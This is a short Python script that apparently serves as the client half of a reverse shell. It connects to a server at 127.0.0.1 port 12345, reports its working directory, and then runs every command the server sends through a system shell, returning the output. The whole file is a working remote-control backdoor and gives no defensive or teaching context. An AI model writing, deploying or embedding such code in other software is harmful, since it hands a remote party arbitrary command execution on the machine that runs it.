import os
import socket
import subprocess

from utils import handle_cd


def start_client():
    host = '127.0.0.1'
    port = 12345

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))

        client_socket.sendall(os.getcwd().encode('utf-8'))

        while True:
            # Receive command from the server
            command = client_socket.recv(4096).decode('utf-8')

            if command.lower() == 'exit':
                break

            cd_result = handle_cd(command)
            if cd_result:
                client_socket.sendall(cd_result.encode('utf-8'))
                continue

            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)

                # Send the result back to the server
                client_socket.sendall(result.stdout.encode('utf-8'))

            except Exception as e:
                # Send any errors back to the server
                client_socket.sendall(str(e).encode('utf-8'))


if __name__ == "__main__":
    start_client()
